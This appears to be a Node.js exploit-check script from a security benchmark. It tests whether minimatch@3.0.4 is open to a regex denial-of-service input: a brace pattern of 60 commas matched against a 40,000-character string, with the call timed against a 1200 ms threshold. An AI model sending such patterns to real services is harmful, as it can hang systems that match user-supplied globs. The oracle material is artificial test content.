let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  const minimatch = require('minimatch');

  // Benign operation: confirm public API works as expected.
  const benign1 = minimatch('file.js', '*.js') === true;
  const benign2 = minimatch('file.txt', '*.js') === false;
  if (!benign1 || !benign2) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'benign_check_failed';
    emit();
  } else {
    operation_completed = true;

    // Known ReDoS trigger for minimatch@3.0.4 comes from brace expansion + extglob parsing,
    // producing a regex with catastrophic backtracking.
    const pattern = '{' + ','.repeat(60) + '}';
    const target = 'a'.repeat(40000);

    const t0 = process.hrtime.bigint();
    let threw = false;
    let result;
    try {
      result = minimatch(target, pattern);
    } catch (err) {
      threw = true;
      result = 'threw';
    }
    const t1 = process.hrtime.bigint();
    const elapsedMs = Number(t1 - t0) / 1e6;

    // Vulnerable versions typically take dramatically longer on this input.
    // Patched versions should complete much faster.
    const thresholdMs = 1200;

    if (threw) {
      exploit_succeeded = false;
      evidence = 'malicious_call_threw;elapsed_ms=' + elapsedMs.toFixed(3);
    } else {
      exploit_succeeded = elapsedMs > thresholdMs;
      evidence = 'elapsed_ms=' + elapsedMs.toFixed(3) + ';threshold_ms=' + thresholdMs + ';result=' + String(result) + ';pattern_commas=60;target_len=40000';
    }

    emit();
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_module_failure:' + (e && e.message ? e.message : String(e));
  emit();
}